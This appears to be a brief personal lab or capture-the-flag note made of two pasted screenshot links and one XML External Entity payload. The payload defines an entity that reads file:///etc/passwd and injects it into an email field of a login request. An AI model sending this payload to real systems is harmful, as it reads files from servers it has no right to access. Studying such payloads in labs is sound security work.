___

![[Pasted image 20241016103113.png]]

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE email [
  <!ENTITY email SYSTEM "file:///etc/passwd">
]>
<root><email>&email;</email><password>test</password></root>
```

![[Pasted image 20241016103522.png]]